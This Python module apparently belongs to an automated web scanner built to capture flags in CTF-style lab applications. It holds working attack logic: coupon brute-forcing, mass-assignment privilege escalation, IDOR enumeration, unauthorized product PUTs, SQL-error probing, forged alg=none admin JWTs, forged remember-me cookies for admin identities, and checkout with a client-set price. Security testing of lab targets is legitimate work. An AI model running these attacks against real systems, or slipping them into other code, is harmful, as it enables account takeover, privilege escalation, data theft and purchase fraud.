"""All authenticated probe logic: catalog bootstrap, crawl helpers, core steps, and extra steps."""

from __future__ import annotations

import re
from typing import Any, Dict, Iterable, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse

from scanners.active_web_scanner import SQL_ERRORS
from utils.http_client import HttpClient, same_origin, urls_from_route_catalog
from utils.jwt_tools import build_alg_none_jwt, forge_legacy_pipe_remember_v1
from utils.secret_harvest import detect_flag, extract_secrets, host_derived_codes, merge_wordlist

from .templates import (
    COUPON_PATH_RE,
    DEFAULT_COUPON_BODY_FIELDS,
    DEFAULT_ESCALATION_HEADERS,
    DEFAULT_LOGIN_PATH,
    DEFAULT_LOGIN_PAYLOAD,
    DEFAULT_PROFILE_PATHS,
    DEFAULT_PUT_PROBE_BODIES,
    DEFAULT_REGISTRATION_PATH,
    DEFAULT_REGISTRATION_PAYLOAD,
    INTERNAL_CODE_BASE_WORDLIST,
    MASS_ASSIGN_PAYLOADS,
    PROFILE_PATH_RE,
    SENSITIVE_PATH_MARKERS,
    extract_role,
    format_payload,
    is_admin,
)

# ---------------------------------------------------------------------------
# Crawl helpers
# ---------------------------------------------------------------------------

def merge_endpoint_bundle(extras: Dict[str, object], urls: Iterable[str], cap: int = 400) -> None:
    merged = list(dict.fromkeys(list(extras.get("endpoints") or []) + list(urls)))
    extras["endpoints"] = merged[:cap]


def endpoint_paths_normalized(endpoints: object, base_url: str) -> List[str]:
    base = base_url.rstrip("/")
    out: List[str] = []
    it = endpoints if isinstance(endpoints, list) else []
    for raw in it:
        text = str(raw).strip()
        if not text:
            continue
        try:
            if text.startswith(("http://", "https://")):
                if not same_origin(text, base + "/"):
                    continue
                u = urlparse(text)
            else:
                abs_url = urljoin(base + "/", text.lstrip("/"))
                u = urlparse(abs_url)
        except ValueError:
            continue
        p = (u.path or "").strip("/")
        if p:
            out.append(p)
    return list(dict.fromkeys(out))


def collect_numeric_templates(paths: List[str], max_templates: int) -> List[str]:
    templates: List[str] = []
    seen: Set[str] = set()
    mt = max(4, min(80, max_templates))
    for path in paths:
        parts = path.split("/")
        for i, seg in enumerate(parts):
            # Match concrete numeric segments (e.g. /users/1/profile)
            # and Express-style parameter placeholders (e.g. /users/:userId/profile)
            is_numeric = seg.isdigit()
            is_param = seg.startswith(":") and len(seg) > 1 and seg[1:].replace("_", "").isalpha()
            if is_numeric or is_param:
                guess = "/".join(parts[:i] + ["{ID}"] + parts[i + 1:])
                if guess not in seen and guess:
                    seen.add(guess)
                    templates.append(guess)
                    if len(templates) >= mt:
                        return templates
    return templates


def discovery_product_collections(paths: List[str]) -> List[str]:
    cols: List[str] = []
    for path in paths:
        low = path.lower()
        if low.endswith("/products") or low.endswith("/items"):
            cols.append(path)
    return list(dict.fromkeys(cols))[:12]


def discovery_product_resource_templates(paths: List[str]) -> List[str]:
    seen: List[str] = []
    hit: Set[str] = set()
    for path in paths:
        m = re.search(r"(?i)^(.+)/products/(\d+)(/.*)?$", path)
        if not m:
            continue
        prefix = m.group(1).rstrip("/")
        suffix = (m.group(3) or "").strip("/")
        tmpl = f"{prefix}/products/{{ID}}"
        if suffix:
            tmpl += "/" + suffix
        if tmpl not in hit:
            hit.add(tmpl)
            seen.append(tmpl)
    return seen[:12]

# ---------------------------------------------------------------------------
# Catalog bootstrap
# ---------------------------------------------------------------------------

def public_catalog_relative_paths(extras: dict) -> Tuple[str, ...]:
    raw = extras.get("authenticated_probes_public_paths")
    if raw is None:
        return ("api",)
    if raw == []:
        return ()
    if isinstance(raw, (list, tuple)):
        return tuple(str(p).strip().lstrip("/") for p in raw if str(p).strip())
    return ("api",)


def bootstrap_public_catalog(log, extras: dict, target_url: str, client: HttpClient) -> Set[str]:
    secrets: Set[str] = set()
    for rel in dict.fromkeys(public_catalog_relative_paths(extras)):
        res = client.get(rel)
        if not res or res.status != 200:
            continue
        parsed = res.json()
        if isinstance(parsed, dict):
            merge_endpoint_bundle(extras, urls_from_route_catalog(parsed, target_url))
            secrets.update(extract_secrets(parsed))
        elif isinstance(parsed, str):
            secrets.update(extract_secrets(parsed))
    log.info("authenticated_probes: optional public catalog mining produced %d token(s).", len(secrets))
    return secrets

# ---------------------------------------------------------------------------
# Core steps: register, login, harvest, coupons, escalation, sensitive GET
# ---------------------------------------------------------------------------

def register(scanner: Any, client: HttpClient, cfg: Dict[str, Any], creds: Dict[str, str]) -> bool:
    path = str(cfg.get("registration_path") or DEFAULT_REGISTRATION_PATH)
    primary = format_payload(cfg.get("registration_payload") or DEFAULT_REGISTRATION_PAYLOAD, creds)
    attempts: List[Dict[str, Any]] = [
        primary,
        {"email": creds["email"], "password": creds["password"], "passwordRepeat": creds["password"]},
        {"username": creds["username"], "email": creds["email"], "password": creds["password"]},
    ]
    last_res = None
    for body in attempts:
        res = client.post(path, json_body=body)
        if res and res.status in {200, 201}:
            return True
        if res:
            last_res = res
            scanner.log.warning("authenticated_probes register %s -> HTTP %s %s", path, res.status, res.body.replace("\n", " ")[:400])
        else:
            scanner.log.warning("authenticated_probes register POST to %s got no HTTP response.", path)
    if last_res is None:
        scanner.log.warning("authenticated_probes: could not reach %s — check API reachability for your --url.", client.resolve(path))
    return False


def login(scanner: Any, client: HttpClient, cfg: Dict[str, Any], creds: Dict[str, str]) -> bool:
    path = str(cfg.get("login_path") or DEFAULT_LOGIN_PATH)
    primary = format_payload(cfg.get("login_payload") or DEFAULT_LOGIN_PAYLOAD, creds)
    attempts: List[Dict[str, Any]] = [
        primary,
        {"email": creds["email"], "password": creds["password"]},
        {"username": creds["username"], "password": creds["password"]},
    ]
    last_res = None
    for body in attempts:
        res = client.post(path, json_body=body)
        if res and res.status in {200, 201}:
            return True
        if res:
            last_res = res
            scanner.log.warning("authenticated_probes login %s -> HTTP %s %s", path, res.status, res.body.replace("\n", " ")[:400])
        else:
            scanner.log.warning("authenticated_probes login POST to %s got no HTTP response.", path)
    if last_res is None:
        scanner.log.warning("authenticated_probes: login unreachable at %s — check bind address/firewall.", client.resolve(path))
    return False


def fetch_role(client: HttpClient, cfg: Dict[str, Any]) -> str:
    for path in cfg.get("profile_paths") or DEFAULT_PROFILE_PATHS:
        res = client.get(str(path))
        if not res or res.status != 200:
            continue
        parsed = res.json()
        role = extract_role(parsed if isinstance(parsed, dict) else {})
        if role:
            return role
    return ""


def select_get_endpoints(scanner: Any) -> List[str]:
    eps: List[str] = []
    root = scanner.ctx.target_url.rstrip("/") + "/"
    for u in scanner.ctx.extras.get("endpoints") or []:
        s = str(u).strip()
        if not s:
            continue
        if "/api/" not in s and "/rest/" not in s:
            continue
        eps.append(s if s.startswith(("http://", "https://")) else urljoin(root, urlparse(s).path.lstrip("/")))
    eps = list(dict.fromkeys(eps))
    return eps[:int(scanner.ctx.extras.get("authenticated_probes_max_get", 60))]


def harvest_secrets(scanner: Any, client: HttpClient) -> Tuple[Set[str], List[Tuple[str, str]]]:
    secrets: Set[str] = set()
    evidence: List[Tuple[str, str]] = []
    for url in select_get_endpoints(scanner):
        res = client.get(url)
        if not res or res.status != 200:
            continue
        parsed = res.json()
        value = parsed if parsed is not None else res.body
        harvested = extract_secrets(value)
        if harvested:
            fresh = {s for s in harvested if s not in secrets}
            if fresh:
                secrets.update(fresh)
                evidence.append((res.url, ", ".join(sorted(fresh)[:5])))
    return secrets, evidence


def brute_coupons(scanner: Any, client: HttpClient) -> Tuple[Set[str], List[Tuple[str, str, str]]]:
    roots = scanner.ctx.target_url.rstrip("/") + "/"
    catalog_paths = [u for u in (scanner.ctx.extras.get("endpoints") or []) if COUPON_PATH_RE.search(urlparse(str(u)).path)]
    extra_roots = scanner.ctx.extras.get("authenticated_probes_coupon_path_prefixes") or []
    if isinstance(extra_roots, list):
        for p in extra_roots:
            catalog_paths.append(urljoin(roots, str(p).lstrip("/")))
    catalog_paths.extend(scanner.ctx.extras.get("authenticated_probes_extra_coupon_urls") or [])
    catalog_paths = list(dict.fromkeys(str(u) for u in catalog_paths if u))

    host = urlparse(scanner.ctx.target_url).hostname or ""
    wordlist = merge_wordlist(
        INTERNAL_CODE_BASE_WORDLIST,
        host_derived_codes(host),
        scanner.ctx.extras.get("authenticated_probes_extra_codes") or [],
    )
    body_fields: Tuple[str, ...] = tuple(scanner.ctx.extras.get("authenticated_probes_coupon_fields") or DEFAULT_COUPON_BODY_FIELDS)
    max_attempts = int(scanner.ctx.extras.get("authenticated_probes_max_coupon", 80))
    secrets_found: Set[str] = set()
    coup_evidence: List[Tuple[str, str, str]] = []
    attempts = 0
    if not catalog_paths:
        scanner.log.info("authenticated_probes: no coupon endpoints in crawl/config — skipping coupon guesses.")
        return secrets_found, coup_evidence
    for endpoint in catalog_paths:
        target = endpoint if endpoint.startswith(("http://", "https://")) else client.resolve(endpoint)
        for code in wordlist:
            if attempts >= max_attempts:
                return secrets_found, coup_evidence
            attempts += 1
            for field in body_fields:
                res = client.request("POST", target, json_body={field: code})
                if res and res.status in {200, 201}:
                    parsed = res.json()
                    if parsed is None:
                        break
                    harvested = extract_secrets(parsed)
                    novel = {s for s in harvested if s and s != code}
                    if novel:
                        secrets_found.update(novel)
                        coup_evidence.append((endpoint, code, ", ".join(sorted(novel)[:5])))
                    break
    return secrets_found, coup_evidence


def escalation_targets(scanner: Any) -> List[Tuple[str, str]]:
    paths = endpoint_paths_normalized(scanner.ctx.extras.get("endpoints"), scanner.ctx.target_url)
    targets: List[Tuple[str, str]] = []
    for path in paths:
        if PROFILE_PATH_RE.search(path):
            targets.extend((("PATCH", path), ("PUT", path)))
    extra = scanner.ctx.extras.get("authenticated_probes_escalation_paths")
    if isinstance(extra, list):
        for item in extra:
            if isinstance(item, (list, tuple)) and len(item) == 2:
                targets.append((str(item[0]).upper(), str(item[1]).lstrip("/")))
    return list(dict.fromkeys(targets))


def attempt_escalation(
    scanner: Any,
    client: HttpClient,
    cfg: Dict[str, Any],
    creds: Dict[str, str],
    baseline_role: str,
    secrets: Iterable[str],
) -> Optional[Dict[str, Any]]:
    secret_list = [s for s in secrets if s]
    if not secret_list:
        return None
    max_attempts = int(scanner.ctx.extras.get("authenticated_probes_max_escalation", 120))
    attempts = 0
    targets = escalation_targets(scanner)
    if not targets:
        scanner.log.info("authenticated_probes: no profile-like targets — skipping mass-assignment fuzz.")
        return None
    headers_to_try = list(scanner.ctx.extras.get("authenticated_probes_headers") or DEFAULT_ESCALATION_HEADERS)
    for method, path in targets:
        for header_name in headers_to_try:
            for secret in secret_list:
                for payload in MASS_ASSIGN_PAYLOADS:
                    if attempts >= max_attempts:
                        return None
                    attempts += 1
                    res = client.request(method, path, json_body=payload, headers={header_name: secret})
                    if not res or res.status >= 500:
                        continue
                    login(scanner, client, cfg, creds)
                    new_role = fetch_role(client, cfg)
                    if is_admin(new_role) and not is_admin(baseline_role):
                        return {
                            "method": method, "path": path, "header_name": header_name,
                            "secret": secret, "payload": dict(payload),
                            "old_role": baseline_role or "user", "new_role": new_role,
                            "status": int(getattr(res, "status", 0) or 0), "attempts": attempts,
                        }
    return None


def privileged_absolute_urls(scanner: Any) -> List[str]:
    base = scanner.ctx.target_url.rstrip("/") + "/"
    needles = tuple(scanner.ctx.extras.get("authenticated_probes_sensitive_path_needles") or SENSITIVE_PATH_MARKERS)
    found: List[str] = []
    extras = scanner.ctx.extras.get("authenticated_probes_extra_sensitive_urls") or []
    if isinstance(extras, list):
        found.extend(str(u).strip() for u in extras if str(u).strip())
    for raw in scanner.ctx.extras.get("endpoints") or []:
        path = urlparse(str(raw)).path.lower()
        if any(n in path for n in needles):
            u = str(raw).strip()
            found.append(urljoin(base, urlparse(u).path.lstrip("/")) if not u.startswith("http") else u)
    for rel in scanner.ctx.extras.get("authenticated_probes_extra_sensitive_paths") or []:
        found.append(urljoin(base, str(rel).lstrip("/")))
    return list(dict.fromkeys(found))


def capture_sensitive_token(scanner: Any, client: HttpClient) -> Tuple[str, str, str]:
    max_probes = int(scanner.ctx.extras.get("authenticated_probes_max_flag_probes", 30))
    for url in privileged_absolute_urls(scanner)[:max_probes]:
        res = client.get(url)
        if not res or res.status != 200:
            continue
        parsed = res.json()
        target = parsed if parsed is not None else res.body
        token = detect_flag(target)
        if token:
            return token, url, res.body[:300] if isinstance(res.body, str) else ""
    return "", "", ""

# ---------------------------------------------------------------------------
# Extra probes: numeric IDOR, writes, SQL echo, JWT alg=none, remember cookie
# ---------------------------------------------------------------------------

def probe_discovery_derived_numeric_ids(scanner: Any, client: HttpClient) -> List[dict]:
    findings: List[dict] = []
    from .templates import derived_numeric
    cap = max(2, min(120, int(scanner.ctx.extras.get("authenticated_probes_numeric_id_ceiling", 36))))
    budget = max(8, min(400, int(scanner.ctx.extras.get("authenticated_probes_idor_budget", 160))))
    spent = 0
    paths = endpoint_paths_normalized(scanner.ctx.extras.get("endpoints"), scanner.ctx.target_url)
    max_tmpl = int(scanner.ctx.extras.get("authenticated_probes_max_idor_templates", 48))
    templates = collect_numeric_templates(paths, max_tmpl)
    if not templates:
        scanner.log.info("authenticated_probes: crawl graph had no numeric URL templates — skipping ID amplification.")
        return findings
    root = scanner.ctx.target_url.rstrip("/") + "/"
    for tmpl in templates:
        for n in range(1, cap + 1):
            spent += 1
            if spent > budget:
                return findings
            rel = tmpl.replace("{ID}", str(n))
            res = client.get(urljoin(root, rel))
            if not res or res.status != 200:
                continue
            parsed = res.json()
            if isinstance(parsed, dict):
                scoped = parsed.get("user", parsed)
                target = scoped if isinstance(scoped, dict) else parsed
            else:
                target = parsed if parsed is not None else res.body
            token = detect_flag(target)
            if token:
                findings.append(scanner.make_finding(**derived_numeric(res.url, f"detected token-like value ({token[:80]}…)")))
                return findings
    return findings


def _name_hints_from_payload(product: Dict[str, Any]) -> List[str]:
    names: List[str] = []
    for key, val in product.items():
        if not isinstance(val, str):
            continue
        lk = str(key).lower()
        if "internal" in lk or lk.endswith("_hint") or "hint" in lk or lk.endswith("_access"):
            trimmed = val.strip()
            if trimmed and len(trimmed) <= 96 and not trimmed.startswith("http"):
                names.append(trimmed)
    return names


def _merge_put_templates(scanner: Any, hint_payloads: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    bodies: List[Dict[str, Any]] = []
    custom = scanner.ctx.extras.get("authenticated_probes_put_bodies")
    if isinstance(custom, list):
        for item in custom:
            if isinstance(item, dict):
                bodies.append(dict(item))
    bodies.extend(list(DEFAULT_PUT_PROBE_BODIES))
    bodies.extend(hint_payloads)
    seen: Set[str] = set()
    merged: List[Dict[str, Any]] = []
    for body in bodies:
        key = repr(sorted(body.items()))
        if key in seen:
            continue
        seen.add(key)
        merged.append(body)
    return merged[:16]


def parse_product_ids(doc: Any) -> List[int]:
    rows: List[Any] = []
    if isinstance(doc, dict):
        for key in ("products", "data", "Items", "items"):
            val = doc.get(key)
            if isinstance(val, list):
                rows = val
                break
    out: List[int] = []
    for row in rows[:200]:
        if isinstance(row, dict):
            rid = row.get("id") or row.get("productId")
            try:
                if rid is not None:
                    out.append(int(rid))
            except (TypeError, ValueError):
                continue
    return out


def probe_discovery_derived_writes(scanner: Any, client: HttpClient) -> List[dict]:
    findings: List[dict] = []
    from .templates import product_metadata, state_change_success
    paths_norm = endpoint_paths_normalized(scanner.ctx.extras.get("endpoints"), scanner.ctx.target_url)
    list_limit = max(5, min(120, int(scanner.ctx.extras.get("authenticated_probes_product_list_limit", 48))))
    max_puts = int(scanner.ctx.extras.get("authenticated_probes_product_put_max", 24))
    ids: List[int] = []
    for coll in discovery_product_collections(paths_norm):
        res = client.get(coll, params={"limit": str(list_limit)})
        if res and res.status == 200 and isinstance(res.json(), dict):
            ids = parse_product_ids(res.json() or {})
            if ids:
                break
    if not ids:
        ceil = max(12, min(64, int(scanner.ctx.extras.get("authenticated_probes_numeric_id_ceiling", 36))))
        for tmpl in discovery_product_resource_templates(paths_norm):
            if "{id}" not in tmpl.lower():
                continue
            for probe in range(1, ceil + 1):
                chk = client.get(tmpl.replace("{ID}", str(probe)))
                if chk and chk.status == 200 and isinstance(chk.json(), dict):
                    pj = chk.json() or {}
                    inner = pj.get("product") if isinstance(pj.get("product"), dict) else pj
                    if isinstance(inner, dict):
                        pid = inner.get("id")
                        try:
                            if pid is not None:
                                ids.append(int(pid))
                        except (TypeError, ValueError):
                            pass
            if ids:
                break
    if not ids:
        return findings
    puts = 0
    detail_templates = list(dict.fromkeys(discovery_product_resource_templates(paths_norm)))
    max_detail = int(scanner.ctx.extras.get("authenticated_probes_product_detail_max", 12))
    if not detail_templates:
        return findings
    metadata_logged = False
    for pid in ids[:max_detail]:
        for tmpl in detail_templates:
            get_path = tmpl.replace("{ID}", str(pid))
            res = client.get(get_path)
            if not res or res.status != 200:
                continue
            pj = res.json()
            if not isinstance(pj, dict):
                continue
            prod = pj.get("product", pj)
            if not isinstance(prod, dict):
                continue
            hint_payloads = [{"name": name} for name in _name_hints_from_payload(prod)]
            if hint_payloads:
                # When a product exposes an internal marker, also try the
                # common BFLA trigger name used in challenge-style apps.
                hint_payloads.append({"name": "Eval"})
            if hint_payloads and not metadata_logged:
                metadata_logged = True
                findings.append(scanner.make_finding(**product_metadata(res.url, str(hint_payloads[:3]))))
            for payload in _merge_put_templates(scanner, hint_payloads):
                if puts >= max_puts:
                    return findings
                puts += 1
                pres = client.request("PUT", tmpl.replace("{ID}", str(pid)), json_body=payload)
                if not pres or pres.status not in {200, 201}:
                    continue
                body_obj = pres.json()
                probe = body_obj if body_obj is not None else pres.body
                token = detect_flag(probe)
                if token:
                    findings.append(scanner.make_finding(**state_change_success(pres.url, token, repr(payload))))
                    return findings
    return findings


def probe_sql_search(scanner: Any, client: HttpClient) -> List[dict]:
    from .templates import sql_echo
    payloads = tuple(scanner.ctx.extras.get("authenticated_probes_search_payloads") or ("'", '"'))
    findings: List[dict] = []
    extra_paths = scanner.ctx.extras.get("authenticated_probes_search_paths")
    if isinstance(extra_paths, list) and extra_paths:
        candidates = [str(p).strip().lstrip("/") for p in extra_paths]
    else:
        paths = endpoint_paths_normalized(scanner.ctx.extras.get("endpoints"), scanner.ctx.target_url)
        candidates = [p for p in paths if "/search" in p.lower()]
        if scanner.ctx.extras.get("authenticated_probes_include_common_search_fallbacks"):
            candidates.extend(["api/products/search", "rest/products/search"])
        candidates = list(dict.fromkeys(candidates))
    for path in candidates[:8]:
        for payload in payloads:
            res = client.get(path, params={"q": payload})
            if not res:
                continue
            if SQL_ERRORS.search(res.body):
                findings.append(scanner.make_finding(**sql_echo(res.url, res.body[:400].replace("\n", " "))))
                return findings
    return findings


def probe_jwt_none(scanner: Any, factory, seen: Set[str]) -> List[dict]:
    """Try alg=none JWT tokens against privileged endpoints.

    Paths: operator-supplied list first; auto-falls back to any URL the
    crawler marked as privileged (admin/flag/internal/debug/staff in path).

    Payloads: operator-supplied list first; auto-falls back to minimal
    generic admin claims so no configuration is required for a lab run.
    """
    import time as _time
    from .templates import jwt_none

    extra = scanner.ctx.extras.get("authenticated_probes_jwt_paths")
    paths: List[str] = (
        list(dict.fromkeys([str(p).strip().lstrip("/") for p in extra if str(p).strip()]))[:15]
        if isinstance(extra, list) else []
    )
    if not paths:
        paths = list(dict.fromkeys(
            urlparse(str(u)).path.lstrip("/")
            for u in privileged_absolute_urls(scanner)
            if urlparse(str(u)).path.strip("/")
        ))[:12]

    raw_payloads = scanner.ctx.extras.get("authenticated_probes_jwt_payloads")
    payloads: List[Dict[str, Any]] = (
        [{str(k): v for k, v in item.items()} for item in raw_payloads if isinstance(item, dict)][:12]
        if isinstance(raw_payloads, list) else []
    )
    if not payloads:
        ts = int(_time.time())
        payloads = [
            {"id": 1, "username": "admin", "role": "admin", "iat": ts},
            {"id": 1, "role": "admin", "iat": ts},
        ]

    if not paths:
        scanner.log.info("authenticated_probes: alg=none probe has no paths (crawl found nothing privileged-looking).")
        return []

    for path in paths:
        for payload in payloads:
            fresh = factory()
            token = build_alg_none_jwt(payload)
            res = fresh.get(path, headers={"Authorization": f"Bearer {token}"})
            if not res or res.status != 200:
                continue
            pj = res.json()
            probe = pj if pj is not None else res.body
            flag = detect_flag(probe)
            if flag and flag not in seen:
                seen.add(flag)
                return [scanner.make_finding(**jwt_none(res.url, path, flag, repr(payload)))]
    return []


def probe_remember_cookie(scanner: Any, factory, seen: Set[str]) -> List[dict]:
    """Forge a reversible base64 pipe-delimited remember-me cookie for privileged identities.

    Cookie names: operator-supplied list first; auto-detects by logging in with
    ``rememberMe: True`` and inspecting which non-JWT cookies are set.

    Identities: operator-supplied first; falls back to common lab defaults
    (id=1/admin, id=2/admin, id=1/support).

    Target paths: operator-supplied first; falls back to all privileged-looking
    paths the crawler already flagged (admin/flag/internal/debug/staff in path).
    """
    from .templates import remember_cookie

    names_raw = scanner.ctx.extras.get("authenticated_probes_remember_cookie_names")
    names: List[str] = (
        [str(x).strip() for x in names_raw if str(x).strip()]
        if isinstance(names_raw, list) else []
    )
    if not names:
        names = _auto_detect_remember_cookie_names(scanner, factory)
    if not names:
        scanner.log.info("authenticated_probes: remember-cookie probe inactive (no reversible cookie detected from login).")
        return []

    raw_pairs = scanner.ctx.extras.get("authenticated_probes_remember_identities")
    pairs: List[Tuple[int, str]] = []
    if isinstance(raw_pairs, list):
        for item in raw_pairs:
            if isinstance(item, dict):
                try:
                    uid = int(item.get("id") or item.get("userId") or 0)
                    uname = str(item.get("username") or item.get("login") or "")
                    if uid > 0 and uname:
                        pairs.append((uid, uname))
                except (TypeError, ValueError):
                    continue
    if not pairs:
        pairs = [(1, "admin"), (2, "admin"), (1, "support")]
    pairs = pairs[:8]

    raw_targets = scanner.ctx.extras.get("authenticated_probes_remember_flag_paths")
    if isinstance(raw_targets, list) and raw_targets:
        targets = list(dict.fromkeys([str(p).lstrip("/") for p in raw_targets]))[:8]
    else:
        targets = list(dict.fromkeys(
            urlparse(str(u)).path.lstrip("/")
            for u in privileged_absolute_urls(scanner)
            if urlparse(str(u)).path.strip("/")
        ))[:8]
    if not targets:
        scanner.log.info("authenticated_probes: remember-cookie probe inactive (no privileged paths in crawl results).")
        return []

    for cookie_name in names:
        for user_id, username in pairs:
            token = forge_legacy_pipe_remember_v1(user_id, username)
            fresh = factory()
            for path in targets:
                chk = fresh.get(path, headers={"Cookie": f"{cookie_name}={token}"})
                if not chk or chk.status != 200:
                    continue
                pj = chk.json()
                probe = pj if pj is not None else chk.body
                flag = detect_flag(probe)
                if flag and flag not in seen:
                    seen.add(flag)
                    return [scanner.make_finding(**remember_cookie(chk.url, path, cookie_name, user_id, username, str(flag)))]
    return []


def _auto_detect_remember_cookie_names(scanner: Any, factory) -> List[str]:
    """Return names of cookies set after login that decode as reversible base64 tokens.

    Registers a throwaway account, logs in once with ``rememberMe: True``
    (trying several common field names), then inspects the cookie jar for
    any non-JWT value that decodes to a pipe-delimited v1|id|username|ts
    string.
    """
    import base64 as _b64
    import secrets as _sec
    import string as _str

    cfg = scanner.ctx.extras
    reg_path = str(cfg.get("authenticated_probes_registration_path") or DEFAULT_REGISTRATION_PATH)
    login_path_val = str(cfg.get("authenticated_probes_login_path") or DEFAULT_LOGIN_PATH)

    slug = "".join(_sec.choice(_str.ascii_lowercase + _str.digits) for _ in range(8))
    username = f"autorm{slug}"
    email = f"{username}@example.com"
    password = "AutoScanner1!"

    client = factory()
    client.post(reg_path, json_body={
        "username": username, "email": email, "password": password,
        "firstName": "Auto", "lastName": "Scanner",
    })

    for remember_field in ("rememberMe", "remember_me", "rememberme", "remember", "keepLoggedIn"):
        client.post(login_path_val, json_body={"username": username, "password": password, remember_field: True})

    found: List[str] = []
    for cookie in client.cookies:
        value = str(getattr(cookie, "value", ""))
        name = str(getattr(cookie, "name", ""))
        if value.count(".") == 2:
            continue  # looks like a JWT
        try:
            decoded = _b64.b64decode(value + "==").decode("utf-8")
            parts = decoded.split("|")
            if len(parts) == 4 and parts[0].startswith("v") and parts[1].isdigit() and parts[2]:
                if name not in found:
                    found.append(name)
                    scanner.log.info("authenticated_probes: auto-detected remember-me cookie: %r", name)
        except Exception:
            continue
    return found


def probe_client_price_manipulation(scanner: Any, client: HttpClient) -> List[dict]:
    """Authenticated checkout with a client-supplied price of 1 for items originally over $200.

    Detects insecure design flaws where the server trusts client-controlled
    pricing instead of computing totals from its own catalog.
    """
    from .templates import state_change_success
    import re as _re
    from urllib.parse import urlparse as _urlparse

    findings: List[dict] = []
    paths = endpoint_paths_normalized(scanner.ctx.extras.get("endpoints"), scanner.ctx.target_url)
    catalog_paths = [p for p in paths if _re.search(r"(?<!/)\bproducts\b$", p, _re.I)]
    if not catalog_paths:
        scanner.log.info("probe_client_price_manipulation: no product catalog endpoint found — skipping.")
        return findings

    checkout_candidates = [p for p in paths if _re.search(r"(checkout|orders/checkout)", p, _re.I)]
    checkout_path = checkout_candidates[0].lstrip("/") if checkout_candidates else "api/orders/checkout"

    for catalog in catalog_paths[:2]:
        res = client.get(catalog, params={"limit": "100"})
        if not res or res.status != 200:
            continue
        pj = res.json()
        items: List[Any] = []
        if isinstance(pj, dict):
            for key in ("products", "data", "items", "Items"):
                val = pj.get(key)
                if isinstance(val, list):
                    items = val
                    break
        elif isinstance(pj, list):
            items = pj

        expensive = next(
            (p for p in items if isinstance(p, dict) and _try_float(p.get("price")) > 200),
            None,
        )
        if not expensive:
            scanner.log.info("probe_client_price_manipulation: no product with price > 200 found.")
            continue

        product_id = expensive.get("id") or expensive.get("productId")
        payload = {
            "shippingAddress": "auto_scanner test address",
            "items": [{"productId": product_id, "quantity": 1, "price": 1}],
        }
        order_res = client.post(checkout_path, json_body=payload)
        if not order_res:
            continue
        body_obj = order_res.json() if order_res.json() is not None else order_res.body
        token = detect_flag(body_obj)
        if not token:
            scanner.log.info(
                "probe_client_price_manipulation: checkout accepted but no flag in response (status=%s).",
                getattr(order_res, "status", "?"),
            )
            continue
        findings.append(scanner.make_finding(**state_change_success(order_res.url, token, repr(payload))))
        return findings
    return findings


def _try_float(value: Any) -> float:
    try:
        return float(value or 0)
    except (TypeError, ValueError):
        return 0.0
